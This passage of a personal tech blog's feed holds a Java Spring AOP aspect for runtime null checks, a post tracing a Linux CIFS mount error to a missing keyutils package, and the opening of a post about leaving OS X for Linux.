&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;foo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nd"&gt;@Nonnull&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nd"&gt;@Nonnull&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;baz&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"bar == NULL"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;baz&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"baz == NULL"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;// ...&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When the code is examined, &lt;code&gt;checkNotNull&lt;/code&gt; calls look totally redundant given
that the parameters are already annotated with &lt;code&gt;@Nonnull&lt;/code&gt;. However, &lt;code&gt;@Nonnull&lt;/code&gt;
just provides an insight to the static code analysis tools and does not have
an effect at runtime, which makes &lt;code&gt;checkNotNull&lt;/code&gt; calls necessary. I thought as
programmers we should be able to do better than this and found myself working
on a way to intercept methods with one or more &lt;code&gt;@Nonnull&lt;/code&gt; annotated parameters
and check if they are null at runtime. Finally, I managed to find a solution
using &lt;a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/html/aop.html"&gt;Spring AOP&lt;/a&gt;.
All you have to do is it include &lt;code&gt;spring-boot-starter-aop&lt;/code&gt; artifact in your
dependencies, add the following Spring aspect to your project, and you are
done.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.aspectj.lang.JoinPoint&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.aspectj.lang.annotation.Aspect&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.aspectj.lang.annotation.Before&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.aspectj.lang.reflect.CodeSignature&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.aspectj.lang.reflect.MethodSignature&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.springframework.stereotype.Component&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.annotation.Nonnull&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.lang.annotation.Annotation&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.ArrayList&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Arrays&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Collections&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.List&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="nd"&gt;@Aspect&lt;/span&gt;
&lt;span class="nd"&gt;@Component&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;NullMonitor&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MethodArgument&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Annotation&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;annotations&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;MethodArgument&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
                &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Annotation&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;annotations&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;annotations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Collections&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;unmodifiableList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;annotations&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;getIndex&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Annotation&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getAnnotations&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;annotations&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;boolean&lt;/span&gt; &lt;span class="nf"&gt;hasAnnotation&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;Annotation&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Annotation&lt;/span&gt; &lt;span class="n"&gt;annotation&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;annotations&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;annotation&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;annotationType&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="nf"&gt;getValue&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;MethodArgument&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JoinPoint&lt;/span&gt; &lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;MethodArgument&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;arguments&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
            &lt;span class="n"&gt;CodeSignature&lt;/span&gt; &lt;span class="n"&gt;codeSignature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CodeSignature&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSignature&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt; 
            &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codeSignature&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameterNames&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;MethodSignature&lt;/span&gt; &lt;span class="n"&gt;methodSignature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
                    &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MethodSignature&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getStaticPart&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSignature&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;Annotation&lt;/span&gt;&lt;span class="o"&gt;[][]&lt;/span&gt; &lt;span class="n"&gt;annotations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;methodSignature&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMethod&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getParameterAnnotations&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getArgs&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt;
                &lt;span class="n"&gt;arguments&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MethodArgument&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
                        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;names&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;Arrays&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;asList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;annotations&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;]),&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;]));&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Collections&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;unmodifiableList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arguments&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="nd"&gt;@Before&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"execution(* *(.., @javax.annotation.Nonnull (*), ..))"&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;nullCheck&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JoinPoint&lt;/span&gt; &lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;MethodSignature&lt;/span&gt; &lt;span class="n"&gt;methodSignature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MethodSignature&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSignature&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MethodArgument&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;MethodArgument&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;joinPoint&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hasAnnotation&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Nonnull&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getValue&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;NullPointerException&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
                        &lt;span class="s"&gt;"%s: argument \"%s\" (at position %d) cannot be null"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                        &lt;span class="n"&gt;methodSignature&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMethod&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getIndex&lt;/span&gt;&lt;span class="o"&gt;()));&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The source code is available in &lt;a href="https://github.com/vy/null-check"&gt;null-check&lt;/a&gt;
project at GitHub with some unit tests and a little bit more detailed
installation instructions.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2015-01-08://blog/post/2015/01/08/smb-mount-troubleshoot/</id>
    <title type="html">Troubleshooting a SMB/CIFS Mount Problem</title>
    <published>2015-01-08T09:43:00Z</published>
    <updated>2015-01-08T09:43:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2015/01/08/smb-mount-troubleshoot/"/>
    <content type="html">
&lt;p&gt;At every introduction to a new office environment, I spend (waste?) a certain
period of time to connect to network shares through CIFS/SMB. This was not
different at my new work place either. After spending almost two days to
troubleshoot the problem, I figured out that the problem was due to the
missing &lt;code&gt;/sbin/request-key&lt;/code&gt; binary provided by &lt;code&gt;keyutils&lt;/code&gt; package in Xubuntu
14.04 LTS. So how did I really get it solved?&lt;/p&gt;

&lt;h1 id="defining-the-problem"&gt;Defining the Problem&lt;/h1&gt;

&lt;p&gt;It is really sick that &lt;code&gt;cifs&lt;/code&gt; kernel module which is responsible for loading
CIFS/SMB filesystems returns &lt;code&gt;EINVAL&lt;/code&gt; (that is, &lt;code&gt;error(22): Invalid argument&lt;/code&gt;)
for an entire family of errors and makes it impossible for the user to spot
the problem. This was also the case for me.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ sudo mount \
	-t cifs //path/to/network/shares /local/mount/point \
	-o credentials=$HOME/.smbcredentials,iocharset=utf8,rw,uid=$USER,serverino
mount error(22): Invalid argument
Refer to the mount.cifs(8) manual page (e.g. man mount.cifs)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So given that the UNC is correct, the local mount point does exist and
accessible, and mount options are valid, &lt;code&gt;invalid argument&lt;/code&gt; error does not
provide any context for the problem.&lt;/p&gt;

&lt;p&gt;Further searching on the internet leaded me to &lt;a href="https://wiki.samba.org/index.php/LinuxCIFS_troubleshooting"&gt;LinuxCIFS
troubleshooting&lt;/a&gt;
at Samba Wiki. There it is told that I can enable debug messages for &lt;code&gt;cifs&lt;/code&gt;
module by echoing a non-zero value to &lt;code&gt;/proc/fs/cifs/cifsFYI&lt;/code&gt;, hence I did so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ echo 1 | sudo tee /proc/fs/cifs/cifsFYI
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And tried to mount the network share again. And observed the following snippet
in the &lt;code&gt;dmesg&lt;/code&gt; output:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CIFS VFS: dns_resolve_server_name_to_ip: unable to resolve: path
CIFS VFS: compose_mount_options: Failed to resolve server part of \\path\to\network\shares to IP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;dns_resolve_server_name_to_ip&lt;/code&gt; could not resolve &lt;code&gt;path&lt;/code&gt; for some reason.&lt;/p&gt;

&lt;h1 id="dns-at-the-kernel-level"&gt;DNS at the Kernel-Level&lt;/h1&gt;

&lt;p&gt;So how does kernel really resolve domain names to IP addresses? After reading
&lt;a href="http://linux.die.net/man/8/mount.cifs"&gt;&lt;code&gt;mount.cifs(8)&lt;/code&gt;&lt;/a&gt; a couple of times, I
saw &lt;em&gt;See Also&lt;/em&gt; section telling that
&lt;a href="https://www.kernel.org/doc/readme/Documentation-filesystems-cifs-README"&gt;&lt;code&gt;Documentation/filesystems/cifs.txt&lt;/code&gt;&lt;/a&gt;
in the linux kernel source tree may contain additional options and
information. I checked that too and spotted the following lines:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;DFS support allows transparent redirection to shares in an MS-DFS name
space. In addition, DFS support for target shares which are specified as UNC
names which begin with host names (rather than IP addresses) requires a user
space helper (such as &lt;code&gt;cifs.upcall&lt;/code&gt;) to be present in order to translate
host names to ip address, and the user space helper must also be configured
in the file &lt;code&gt;/etc/request-key.conf&lt;/code&gt;.  Samba, Windows servers and many NAS
appliances support DFS as a way of constructing a global name space to ease
network configuration and improve reliability.&lt;/p&gt;

  &lt;p&gt;To use cifs Kerberos and DFS support, the Linux &lt;code&gt;keyutils&lt;/code&gt; package should be
installed and something like the following lines should be added to the
&lt;code&gt;/etc/request-key.conf&lt;/code&gt; file:&lt;/p&gt;

  &lt;pre&gt;&lt;code&gt;create cifs.spnego * * /usr/local/sbin/cifs.upcall %k
create dns_resolver * * /usr/local/sbin/cifs.upcall %k
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was getting interesting. I spotted the &lt;code&gt;dns_resolver&lt;/code&gt; keyword at the
bottom and started reading
&lt;a href="https://www.kernel.org/doc/Documentation/networking/dns_resolver.txt"&gt;&lt;code&gt;Documentation/networking/dns_resolver.txt&lt;/code&gt;&lt;/a&gt;
as well.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The DNS resolver module provides a way for kernel services to make DNS
queries by way of requesting a key of key type &lt;code&gt;dns_resolver&lt;/code&gt;.  These
queries are upcalled to userspace through &lt;code&gt;/sbin/request-key&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The long story short, CIFS module employs DNS resolver module, which
internally upcalls the queries to userspace through &lt;code&gt;/sbin/request-key&lt;/code&gt;. I got
further curious and checked the &lt;code&gt;request-key(8)&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This  program  is invoked by the kernel when the kernel is asked for a key
that it doesn’t have immediately available. The kernel creates a partially
set up key and then calls out to this program to instantiate it. It is not
intended to be called directly.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id="the-solution"&gt;The Solution&lt;/h1&gt;

&lt;p&gt;Everything was pointing that something was wrong with my &lt;code&gt;/sbin/request-key&lt;/code&gt;.
Ooops! The binary was not there at all. &lt;code&gt;apt-file search /sbin/request-key&lt;/code&gt;
told that the binary was provided by &lt;code&gt;keyutils&lt;/code&gt; package, which was missing in
my system. After installing &lt;code&gt;keyutils&lt;/code&gt;, I did not observe any DNS resolver
issues in the &lt;code&gt;dmesg&lt;/code&gt; logs and &lt;code&gt;mount.cifs&lt;/code&gt; worked without a problem.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2015-01-01://blog/post/2015/01/01/xubuntu-on-macbookpro/</id>
    <title type="html">The Joy of Ditching OSX for GNU/Linux</title>
    <published>2015-01-01T17:22:00Z</published>
    <updated>2015-01-01T17:22:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2015/01/01/xubuntu-on-macbookpro/"/>
    <content type="html">
&lt;p&gt;Two months ago I was given a shiny Apple Macbook Pro 11 as my development
system at work. This was my first introduction to Apple – with the exception
of using Macintosh Classic at my fathers printing office back in the early
90s. After spending more than 15 years in the mazes of GNU/Linux ecosystem, it
made a cold bath effect on me and I needed at least 2-3 days to get adapted to
the system and start writing a couple of lines of useful code. I must admit
that I was uncomfortable and, as a result of this, unhappy from the very first
moment. The hardware was gorgeous; battery life, display resolution, quality,
and colors were mind-blowing and of no match. That being said, I really could
not get the feel of a &lt;em&gt;power-user&lt;/em&gt; that I used to have in my old GNU/Linux
box. Having the menu shared between windows was almost made me puke. I have
been using &lt;a href="http://en.wikipedia.org/wiki/Focus_%28compu%0Ating%29#Focus_follows_pointer"&gt;focus follows pointer&lt;/a&gt; feature for quite some time and it was out of
